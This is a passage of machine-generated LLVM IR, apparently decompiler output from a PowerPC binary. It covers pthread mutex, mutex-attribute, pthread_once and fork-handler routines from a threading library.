  %v3_1001673c = icmp eq i32 %v2_10016738, 0
  br i1 %v3_1001673c, label %dec_label_pc_1001674c, label %dec_label_pc_10016744

dec_label_pc_1001676c:                            ; preds = %dec_label_pc_1001674c
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001674c, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10016774 = icmp eq i32* %arg2, null
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001677c = add i32 %arg1, 20
  %v3_1001677c = inttoptr i32 %v2_1001677c to i32*
  store i32 0, i32* %v3_1001677c, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v0_10016784 = load i32, i32* %r0.global-to-local, align 4
  %v2_10016784 = add i32 %arg1, 16
  %v3_10016784 = inttoptr i32 %v2_10016784 to i32*
  store i32 %v0_10016784, i32* %v3_10016784, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br i1 %v3_10016774, label %dec_label_pc_10016794, label %dec_label_pc_10016790

dec_label_pc_10016790:                            ; preds = %entry
  %v2_10016790 = load i32, i32* %arg2, align 4
  store i32 %v2_10016790, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10016794

dec_label_pc_10016794:                            ; preds = %entry, %dec_label_pc_10016790
  %v0_10016794 = load i32, i32* %r9.global-to-local, align 4
  %v2_10016794 = add i32 %arg1, 8
  %v3_10016794 = inttoptr i32 %v2_10016794 to i32*
  store i32 %v0_10016794, i32* %v3_10016794, align 4
  %v0_10016798 = load i32, i32* %r0.global-to-local, align 4
  %v2_10016798 = add i32 %arg1, 12
  %v3_10016798 = inttoptr i32 %v2_10016798 to i32*
  store i32 %v0_10016798, i32* %v3_10016798, align 4
  %v0_1001679c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001679c = add i32 %arg1, 4
  %v3_1001679c = inttoptr i32 %v2_1001679c to i32*
  store i32 %v0_1001679c, i32* %v3_1001679c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_10016794, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100167a8 = add i32 %arg1, 12
  %v2_100167a8 = inttoptr i32 %v1_100167a8 to i32*
  %v3_100167a8 = load i32, i32* %v2_100167a8, align 4
  %v1_100167b0 = icmp slt i32 %v3_100167a8, 0
  br i1 %v1_100167b0, label %dec_label_pc_100167f4, label %dec_label_pc_100167bc

dec_label_pc_100167bc:                            ; preds = %entry
  %tmp = icmp slt i32 %v3_100167a8, 2
  br i1 %tmp, label %dec_label_pc_100167cc, label %dec_label_pc_100167c4

dec_label_pc_100167c4:                            ; preds = %dec_label_pc_100167bc
  %tmp2 = icmp slt i32 %v3_100167a8, 4
  br i1 %tmp2, label %dec_label_pc_100167dc, label %dec_label_pc_100167f4

dec_label_pc_100167cc:                            ; preds = %dec_label_pc_100167bc
  %v1_100167cc = add i32 %arg1, 16
  %v2_100167cc = inttoptr i32 %v1_100167cc to i32*
  %v3_100167cc = load i32, i32* %v2_100167cc, align 4
  %v1_100167d0 = urem i32 %v3_100167cc, 2
  %v3_100167d0 = icmp eq i32 %v1_100167d0, 0
  br i1 %v3_100167d0, label %dec_label_pc_100167f0, label %dec_label_pc_100167e8

dec_label_pc_100167dc:                            ; preds = %dec_label_pc_100167c4
  %v1_100167dc = add i32 %arg1, 16
  %v2_100167dc = inttoptr i32 %v1_100167dc to i32*
  %v3_100167dc = load i32, i32* %v2_100167dc, align 4
  %v3_100167e0 = icmp eq i32 %v3_100167dc, 0
  br i1 %v3_100167e0, label %dec_label_pc_100167f0, label %dec_label_pc_100167e8

dec_label_pc_100167e8:                            ; preds = %dec_label_pc_100167cc, %dec_label_pc_100167dc
  br label %dec_label_pc_100167f4

dec_label_pc_100167f0:                            ; preds = %dec_label_pc_100167cc, %dec_label_pc_100167dc
  br label %dec_label_pc_100167f4

dec_label_pc_100167f4:                            ; preds = %dec_label_pc_100167c4, %entry, %dec_label_pc_100167e8, %dec_label_pc_100167f0
  %v0_100167f4 = phi i32 [ 22, %dec_label_pc_100167c4 ], [ 22, %entry ], [ 16, %dec_label_pc_100167e8 ], [ 0, %dec_label_pc_100167f0 ]
  ret i32 %v0_100167f4

; uselistorder directives
  uselistorder label %dec_label_pc_100167f4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100167f0, { 1, 0 }
  uselistorder label %dec_label_pc_100167e8, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10016814 = icmp ugt i32 %arg2, 3
  br i1 %v2_10016814, label %dec_label_pc_10016828, label %dec_label_pc_10016820

dec_label_pc_10016820:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10016828

dec_label_pc_10016828:                            ; preds = %entry, %dec_label_pc_10016820
  %v0_10016828 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10016820 ]
  ret i32 %v0_10016828

; uselistorder directives
  uselistorder label %dec_label_pc_10016828, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10016830 = load i32, i32* %arg1, align 4
  %v2_10016838 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10016830, i32* %v2_10016838, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10016850 = icmp eq i32 %arg1, 0
  %v2_10016850 = icmp ugt i32 %arg1, 1
  %v0_10016860 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10016850, i32 %v0_10016860)
  %v1_10016868 = select i1 %v1_10016850, i32 0, i32 38
  ret i32 %v1_10016868
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10016888 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32* null)
  %v3_10016898 = call i32 @pthread_cond_init(i32* nonnull @global_var_100496e4.1076, i32 0)
  store i32 268697600, i32* @r11, align 4
  %v3_100168a0 = load i32, i32* @global_var_10045200.1077, align 4
  %v3_100168ac = icmp sgt i32 %v3_100168a0, 2147483643
  %v1_100168b0 = add i32 %v3_100168a0, 4
  br i1 %v3_100168ac, label %dec_label_pc_100168c0, label %dec_label_pc_100168c8

dec_label_pc_100168c0:                            ; preds = %entry
  br label %dec_label_pc_100168c8

dec_label_pc_100168c8:                            ; preds = %entry, %dec_label_pc_100168c0
  %storemerge = phi i32 [ 0, %dec_label_pc_100168c0 ], [ %v1_100168b0, %entry ]
  store i32 %storemerge, i32* @global_var_10045200.1077, align 4
  ret i32 %v3_10016898

; uselistorder directives
  uselistorder label %dec_label_pc_100168c8, { 1, 0 }
}

define i32 @pthread_mutex_unlock() local_unnamed_addr {
entry:
  %v0_100168e4 = load i32, i32* @r3, align 4
  %v1_100168e4 = add i32 %v0_100168e4, 12
  %v2_100168e4 = inttoptr i32 %v1_100168e4 to i32*
  %v3_100168e4 = load i32, i32* %v2_100168e4, align 4
  %v3_100168e8 = icmp eq i32 %v3_100168e4, 1
  br i1 %v3_100168e8, label %dec_label_pc_10016918, label %dec_label_pc_100168f0

dec_label_pc_100168f0:                            ; preds = %entry
  %v2_100168e8 = icmp sgt i32 %v3_100168e4, 1
  br i1 %v2_100168e8, label %dec_label_pc_10016900, label %dec_label_pc_100168f4

dec_label_pc_100168f4:                            ; preds = %dec_label_pc_100168f0
  %v3_100168f4 = icmp eq i32 %v3_100168e4, 0
  br i1 %v3_100168f4, label %dec_label_pc_10016948, label %dec_label_pc_10016910

dec_label_pc_10016900:                            ; preds = %dec_label_pc_100168f0
  %v3_10016900 = icmp eq i32 %v3_100168e4, 2
  br i1 %v3_10016900, label %dec_label_pc_10016958, label %dec_label_pc_10016908

dec_label_pc_10016908:                            ; preds = %dec_label_pc_10016900
  %v3_10016908 = icmp eq i32 %v3_100168e4, 3
  br i1 %v3_10016908, label %dec_label_pc_10016978, label %dec_label_pc_10016910

dec_label_pc_10016910:                            ; preds = %dec_label_pc_100168f4, %dec_label_pc_10016908
  store i32 22, i32* @r9, align 4
  br label %dec_label_pc_10016988

dec_label_pc_10016918:                            ; preds = %entry
  %v1_10016918 = add i32 %v0_100168e4, 8
  %v2_10016918 = inttoptr i32 %v1_10016918 to i32*
  %v3_10016918 = load i32, i32* %v2_10016918, align 4
  %v1_1001691c = load i32, i32* @r2, align 4
  %v4_1001691c = icmp eq i32 %v3_10016918, %v1_1001691c
  br i1 %v4_1001691c, label %dec_label_pc_10016924, label %dec_label_pc_10016984

dec_label_pc_10016924:                            ; preds = %dec_label_pc_10016918
  %v1_10016924 = add i32 %v0_100168e4, 4
  %v2_10016924 = inttoptr i32 %v1_10016924 to i32*
  %v3_10016924 = load i32, i32* %v2_10016924, align 4
  %tmp6 = icmp slt i32 %v3_10016924, 1
  br i1 %tmp6, label %dec_label_pc_10016940, label %dec_label_pc_10016930

dec_label_pc_10016930:                            ; preds = %dec_label_pc_10016924
  %v1_10016930 = add i32 %v3_10016924, -1
  store i32 0, i32* @r9, align 4
  store i32 %v1_10016930, i32* %v2_10016924, align 4
  %v0_1001698c.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10016988

dec_label_pc_10016940:                            ; preds = %dec_label_pc_10016924
  store i32 0, i32* %v2_10016918, align 4
  %v0_10016948.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10016948

dec_label_pc_10016948:                            ; preds = %dec_label_pc_100168f4, %dec_label_pc_10016940
  %v0_10016948 = phi i32 [ %v0_100168e4, %dec_label_pc_100168f4 ], [ %v0_10016948.pre, %dec_label_pc_10016940 ]
  %v1_10016948 = add i32 %v0_10016948, 16
  store i32 %v1_10016948, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016950.1078 to i32), i32* @lr, align 4
  %v0_1001694c = call i32 @__pthread_unlock()
  br label %dec_label_pc_10016950

dec_label_pc_10016950:                            ; preds = %dec_label_pc_10016978, %dec_label_pc_10016948
  store i32 0, i32* @r9, align 4
  br label %dec_label_pc_10016988

dec_label_pc_10016958:                            ; preds = %dec_label_pc_10016900
  %v1_10016958 = add i32 %v0_100168e4, 8
  %v2_10016958 = inttoptr i32 %v1_10016958 to i32*
  %v3_10016958 = load i32, i32* %v2_10016958, align 4
  %v1_1001695c = load i32, i32* @r2, align 4
  %v4_1001695c = icmp eq i32 %v3_10016958, %v1_1001695c
  br i1 %v4_1001695c, label %dec_label_pc_10016964, label %dec_label_pc_10016984

dec_label_pc_10016964:                            ; preds = %dec_label_pc_10016958
  %v1_10016964 = add i32 %v0_100168e4, 16
  %v2_10016964 = inttoptr i32 %v1_10016964 to i32*
  %v3_10016964 = load i32, i32* %v2_10016964, align 4
  %v3_10016968 = icmp eq i32 %v3_10016964, 0
  br i1 %v3_10016968, label %dec_label_pc_10016984, label %dec_label_pc_10016970

dec_label_pc_10016970:                            ; preds = %dec_label_pc_10016964
  store i32 0, i32* %v2_10016958, align 4
  %v0_10016978.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10016978

dec_label_pc_10016978:                            ; preds = %dec_label_pc_10016908, %dec_label_pc_10016970
  %v0_10016978 = phi i32 [ %v0_100168e4, %dec_label_pc_10016908 ], [ %v0_10016978.pre, %dec_label_pc_10016970 ]
  %v1_10016978 = add i32 %v0_10016978, 16
  store i32 268528000, i32* @lr, align 4
  %v1_1001697c = inttoptr i32 %v1_10016978 to i32*
  %v2_1001697c = call i32 @__pthread_alt_unlock(i32* %v1_1001697c)
  br label %dec_label_pc_10016950

dec_label_pc_10016984:                            ; preds = %dec_label_pc_10016918, %dec_label_pc_10016958, %dec_label_pc_10016964
  store i32 1, i32* @r9, align 4
  br label %dec_label_pc_10016988

dec_label_pc_10016988:                            ; preds = %dec_label_pc_10016910, %dec_label_pc_10016950, %dec_label_pc_10016930, %dec_label_pc_10016984
  %v0_1001698c = phi i32 [ 22, %dec_label_pc_10016910 ], [ 0, %dec_label_pc_10016950 ], [ %v0_1001698c.pre, %dec_label_pc_10016930 ], [ 1, %dec_label_pc_10016984 ]
  ret i32 %v0_1001698c

; uselistorder directives
  uselistorder i32 %v0_100168e4, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder label %dec_label_pc_10016988, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10016984, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10016978, { 1, 0 }
  uselistorder label %dec_label_pc_10016948, { 1, 0 }
  uselistorder label %dec_label_pc_10016910, { 1, 0 }
}

define i32 @__pthread_once_fork_parent(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32* @r3, align 4
  %v0_100169a4 = call i32 @pthread_mutex_unlock()
  ret i32 %v0_100169a4
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_100169bc = add i32 %arg1, 12
  %v2_100169bc = inttoptr i32 %v1_100169bc to i32*
  %v3_100169bc = load i32, i32* %v2_100169bc, align 4
  %v3_100169c0 = icmp eq i32 %v3_100169bc, 1
  br i1 %v3_100169c0, label %dec_label_pc_10016a00, label %dec_label_pc_100169c8

dec_label_pc_100169c8:                            ; preds = %entry
  %v2_100169c0 = icmp sgt i32 %v3_100169bc, 1
  br i1 %v2_100169c0, label %dec_label_pc_100169d8, label %dec_label_pc_100169cc

dec_label_pc_100169cc:                            ; preds = %dec_label_pc_100169c8
  %v3_100169cc = icmp eq i32 %v3_100169bc, 0
  br i1 %v3_100169cc, label %dec_label_pc_100169f0, label %dec_label_pc_100169e8

dec_label_pc_100169d8:                            ; preds = %dec_label_pc_100169c8
  %v3_100169d8 = icmp eq i32 %v3_100169bc, 2
  br i1 %v3_100169d8, label %dec_label_pc_10016a40, label %dec_label_pc_100169e0

dec_label_pc_100169e0:                            ; preds = %dec_label_pc_100169d8
  %v3_100169e0 = icmp eq i32 %v3_100169bc, 3
  br i1 %v3_100169e0, label %dec_label_pc_10016a6c, label %dec_label_pc_100169e8

dec_label_pc_100169e8:                            ; preds = %dec_label_pc_100169cc, %dec_label_pc_100169e0
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016a7c

dec_label_pc_100169f0:                            ; preds = %dec_label_pc_100169cc
  %v1_100169f0 = add i32 %arg1, 16
  store i32 %v1_100169f0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100169fc.1079 to i32), i32* @lr, align 4
  %v0_100169f8 = call i32 @__pthread_lock()
  br label %dec_label_pc_10016a78

dec_label_pc_10016a00:                            ; preds = %entry
  %v1_10016a00 = add i32 %arg1, 8
  %v2_10016a00 = inttoptr i32 %v1_10016a00 to i32*
  %v3_10016a00 = load i32, i32* %v2_10016a00, align 4
  %v0_10016a04 = load i32, i32* @r2, align 4
  store i32 %v0_10016a04, i32* @r30, align 4
  %v4_10016a08 = icmp eq i32 %v3_10016a00, %v0_10016a04
  br i1 %v4_10016a08, label %dec_label_pc_10016a10, label %dec_label_pc_10016a24

dec_label_pc_10016a10:                            ; preds = %dec_label_pc_10016a00
  %v1_10016a10 = add i32 %arg1, 4
  %v2_10016a10 = inttoptr i32 %v1_10016a10 to i32*
  %v3_10016a10 = load i32, i32* %v2_10016a10, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016a18 = add i32 %v3_10016a10, 1
  store i32 %v1_10016a18, i32* @r9, align 4
  store i32 %v1_10016a18, i32* %v2_10016a10, align 4
  br label %dec_label_pc_10016a7c

dec_label_pc_10016a24:                            ; preds = %dec_label_pc_10016a00
  %v1_10016a24 = add i32 %arg1, 16
  store i32 %v1_10016a24, i32* @r3, align 4
  store i32 %v0_10016a04, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10016a30.1080 to i32), i32* @lr, align 4
  %v0_10016a2c = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016a38 = load i32, i32* @r31, align 4
  %v2_10016a38 = add i32 %v1_10016a38, 4
  %v3_10016a38 = inttoptr i32 %v2_10016a38 to i32*
  store i32 0, i32* %v3_10016a38, align 4
  br label %dec_label_pc_10016a64

dec_label_pc_10016a40:                            ; preds = %dec_label_pc_100169d8
  %v1_10016a40 = add i32 %arg1, 8
  %v2_10016a40 = inttoptr i32 %v1_10016a40 to i32*
  %v3_10016a40 = load i32, i32* %v2_10016a40, align 4
  %v0_10016a44 = load i32, i32* @r2, align 4
  store i32 %v0_10016a44, i32* @r30, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10016a4c = icmp eq i32 %v3_10016a40, %v0_10016a44
  br i1 %v4_10016a4c, label %dec_label_pc_10016a7c, label %dec_label_pc_10016a54

dec_label_pc_10016a54:                            ; preds = %dec_label_pc_10016a40
  %v1_10016a54 = add i32 %arg1, 16
  store i32 %v1_10016a54, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016a60.1081 to i32), i32* @lr, align 4
  %v2_10016a5c = inttoptr i32 %v1_10016a54 to i32*
  %v3_10016a5c = call i32 @__pthread_alt_lock(i32* %v2_10016a5c, i32 %v0_10016a44)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016a64

dec_label_pc_10016a64:                            ; preds = %dec_label_pc_10016a24, %dec_label_pc_10016a54
  %v0_10016a64 = load i32, i32* @r30, align 4
  %v1_10016a64 = load i32, i32* @r31, align 4
  %v2_10016a64 = add i32 %v1_10016a64, 8
  %v3_10016a64 = inttoptr i32 %v2_10016a64 to i32*
  store i32 %v0_10016a64, i32* %v3_10016a64, align 4
  br label %dec_label_pc_10016a7c

dec_label_pc_10016a6c:                            ; preds = %dec_label_pc_100169e0
  %v1_10016a6c = add i32 %arg1, 16
  store i32 %v1_10016a6c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016a78.1082 to i32), i32* @lr, align 4
  %v2_10016a74 = inttoptr i32 %v1_10016a6c to i32*
  %v3_10016a74 = call i32 @__pthread_alt_lock(i32* %v2_10016a74, i32 0)
  br label %dec_label_pc_10016a78

dec_label_pc_10016a78:                            ; preds = %dec_label_pc_100169f0, %dec_label_pc_10016a6c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016a7c

dec_label_pc_10016a7c:                            ; preds = %dec_label_pc_10016a40, %dec_label_pc_10016a64, %dec_label_pc_10016a10, %dec_label_pc_100169e8, %dec_label_pc_10016a78
  %v0_10016a8c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016a8c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0 }
  uselistorder i32 %arg1, { 7, 0, 1, 6, 5, 2, 8, 4, 3, 9 }
  uselistorder label %dec_label_pc_10016a7c, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10016a78, { 1, 0 }
  uselistorder label %dec_label_pc_10016a64, { 1, 0 }
  uselistorder label %dec_label_pc_100169e8, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10016a98 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496cc.1075 to i32))
  ret i32 %v1_10016a98
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10016ab4 = load i32, i32* %arg1, align 4
  %v3_10016ab8 = icmp eq i32 %v2_10016ab4, 2
  br i1 %v3_10016ab8, label %dec_label_pc_10016bb4, label %dec_label_pc_10016ac8

dec_label_pc_10016ac8:                            ; preds = %entry
  store i32 268528340, i32* @lr, align 4
  %v1_10016ad0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496cc.1075 to i32))
  %v0_10016ad4 = load i32, i32* @r31, align 4
  %v1_10016ad4 = inttoptr i32 %v0_10016ad4 to i32*
  %v2_10016ad4 = load i32, i32* %v1_10016ad4, align 4
  store i32 %v2_10016ad4, i32* @r11, align 4
  %v1_10016ad8 = urem i32 %v2_10016ad4, 4
  %v3_10016adc = icmp eq i32 %v1_10016ad8, 1
  br i1 %v3_10016adc, label %dec_label_pc_10016ae4, label %dec_label_pc_10016b08.preheader

dec_label_pc_10016ae4:                            ; preds = %dec_label_pc_10016ac8
  %v1_10016ae8 = call i32 @__asm_rlwinm(i32 %v2_10016ad4, i32 0, i32 0, i32 29)
  %v3_10016aec = load i32, i32* @global_var_10045200.1077, align 4
  %v4_10016af0 = icmp eq i32 %v1_10016ae8, %v3_10016aec
  br i1 %v4_10016af0, label %dec_label_pc_10016b08.preheader, label %dec_label_pc_10016af8

dec_label_pc_10016af8:                            ; preds = %dec_label_pc_10016ae4
  %v1_10016afc = load i32, i32* @r31, align 4
  %v2_10016afc = inttoptr i32 %v1_10016afc to i32*
  store i32 0, i32* %v2_10016afc, align 4
  br label %dec_label_pc_10016b08.preheader

dec_label_pc_10016b08.preheader:                  ; preds = %dec_label_pc_10016af8, %dec_label_pc_10016ae4, %dec_label_pc_10016ac8
  %v0_10016b085 = load i32, i32* @r31, align 4
  %v1_10016b086 = inttoptr i32 %v0_10016b085 to i32*
  %v2_10016b087 = load i32, i32* %v1_10016b086, align 4
  store i32 %v2_10016b087, i32* @r9, align 4
  %v1_10016b1c8 = urem i32 %v2_10016b087, 4
  %v3_10016b2011 = icmp eq i32 %v1_10016b1c8, 1
  br i1 %v3_10016b2011, label %dec_label_pc_10016b04, label %dec_label_pc_10016b28

dec_label_pc_10016b04:                            ; preds = %dec_label_pc_10016b08.preheader, %dec_label_pc_10016b04
  %v2_10016b0812 = phi i32 [ %v2_10016b08, %dec_label_pc_10016b04 ], [ %v2_10016b087, %dec_label_pc_10016b08.preheader ]
  store i32 268528392, i32* @lr, align 4
  %v3_10016b04 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_100496e4.1076 to i32), i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32 %v2_10016b0812)
  %v0_10016b08 = load i32, i32* @r31, align 4
  %v1_10016b08 = inttoptr i32 %v0_10016b08 to i32*
  %v2_10016b08 = load i32, i32* %v1_10016b08, align 4
  store i32 %v2_10016b08, i32* @r9, align 4
  %v1_10016b1c = urem i32 %v2_10016b08, 4
  %v3_10016b20 = icmp eq i32 %v1_10016b1c, 1
  br i1 %v3_10016b20, label %dec_label_pc_10016b04, label %dec_label_pc_10016b28

dec_label_pc_10016b28:                            ; preds = %dec_label_pc_10016b04, %dec_label_pc_10016b08.preheader
  %v1_10016b08.lcssa = phi i32* [ %v1_10016b086, %dec_label_pc_10016b08.preheader ], [ %v1_10016b08, %dec_label_pc_10016b04 ]
  %v2_10016b08.lcssa = phi i32 [ %v2_10016b087, %dec_label_pc_10016b08.preheader ], [ %v2_10016b08, %dec_label_pc_10016b04 ]
  %v3_10016b28 = icmp eq i32 %v2_10016b08.lcssa, 0
  store i32 0, i32* @r29, align 4
  br i1 %v3_10016b28, label %dec_label_pc_10016b34, label %dec_label_pc_10016b94

dec_label_pc_10016b34:                            ; preds = %dec_label_pc_10016b28
  store i32 268697600, i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32* @r3, align 4
  %v3_10016b3c = load i32, i32* @global_var_10045200.1077, align 4
  store i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32* @r29, align 4
  %v2_10016b44 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10016b44, i32* @r28, align 4
  %v1_10016b48 = or i32 %v3_10016b3c, 1
  store i32 %v1_10016b48, i32* %v1_10016b08.lcssa, align 4
  store i32 268528468, i32* @lr, align 4
  %v0_10016b50 = call i32 @pthread_mutex_unlock()
  %v0_10016b58 = load i32, i32* @r31, align 4
  %v4_10016b64 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-40, i32 268528588, i32 %v0_10016b58)
  %v0_10016b68 = load i32, i32* @r30, align 4
  call void @__pseudo_call(i32 %v0_10016b68)
  store i32 268528508, i32* @lr, align 4
  %v3_10016b78 = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-40, i32 0)
  %v0_10016b7c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10016b84.1083 to i32), i32* @lr, align 4
  %v1_10016b80 = call i32 @pthread_mutex_lock(i32 %v0_10016b7c)
  store i32 1, i32* @r29, align 4
  %v1_10016b90 = load i32, i32* @r31, align 4
  %v2_10016b90 = inttoptr i32 %v1_10016b90 to i32*
  store i32 2, i32* %v2_10016b90, align 4
  br label %dec_label_pc_10016b94

dec_label_pc_10016b94:                            ; preds = %dec_label_pc_10016b28, %dec_label_pc_10016b34
  store i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32* @r3, align 4
  store i32 268528544, i32* @lr, align 4
  %v0_10016b9c = call i32 @pthread_mutex_unlock()
  %v0_10016ba0 = load i32, i32* @r29, align 4
  %v3_10016ba0 = icmp eq i32 %v0_10016ba0, 0
  br i1 %v3_10016ba0, label %dec_label_pc_10016bb4, label %dec_label_pc_10016ba8

dec_label_pc_10016ba8:                            ; preds = %dec_label_pc_10016b94
  store i32 268528564, i32* @lr, align 4
  %v1_10016bb0 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_100496e4.1076 to i32))
  br label %dec_label_pc_10016bb4

dec_label_pc_10016bb4:                            ; preds = %entry, %dec_label_pc_10016b94, %dec_label_pc_10016ba8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10016b08, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10016b087, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10016ad4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* @global_var_10045200.1077, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10016bb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10016b94, { 1, 0 }
  uselistorder label %dec_label_pc_10016b04, { 1, 0 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10016bf0.1084 to i32), i32* @lr, align 4
  %v1_10016bec = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496cc.1075 to i32))
  store i32 0, i32* %arg1, align 4
  %v0_10016bf8 = load i32, i32* @r29, align 4
  store i32 %v0_10016bf8, i32* @r3, align 4
  store i32 268528640, i32* @lr, align 4
  %v0_10016bfc = call i32 @pthread_mutex_unlock()
  store i32 268528652, i32* @lr, align 4
  %v1_10016c08 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_100496e4.1076 to i32))
  ret i32 %v1_10016c08

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_100496e4.1076, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100496e4.1076 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100496cc.1075 to i32), { 3, 7, 8, 2, 1, 0, 4, 5, 9, 6 }
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10016c34 = add i32 %arg1, 12
  %v2_10016c34 = inttoptr i32 %v1_10016c34 to i32*
  %v3_10016c34 = load i32, i32* %v2_10016c34, align 4
  %v3_10016c38 = icmp eq i32 %v3_10016c34, 1
  br i1 %v3_10016c38, label %dec_label_pc_10016c80, label %dec_label_pc_10016c40

dec_label_pc_10016c40:                            ; preds = %entry
  %v2_10016c38 = icmp sgt i32 %v3_10016c34, 1
  br i1 %v2_10016c38, label %dec_label_pc_10016c50, label %dec_label_pc_10016c44

dec_label_pc_10016c44:                            ; preds = %dec_label_pc_10016c40
  %v3_10016c44 = icmp eq i32 %v3_10016c34, 0
  br i1 %v3_10016c44, label %dec_label_pc_10016c68, label %dec_label_pc_10016c60

dec_label_pc_10016c50:                            ; preds = %dec_label_pc_10016c40
  %v3_10016c50 = icmp eq i32 %v3_10016c34, 2
  br i1 %v3_10016c50, label %dec_label_pc_10016cc0, label %dec_label_pc_10016c58

dec_label_pc_10016c58:                            ; preds = %dec_label_pc_10016c50
  %v3_10016c58 = icmp eq i32 %v3_10016c34, 3
  br i1 %v3_10016c58, label %dec_label_pc_10016cd8, label %dec_label_pc_10016c60

dec_label_pc_10016c60:                            ; preds = %dec_label_pc_10016c44, %dec_label_pc_10016c58
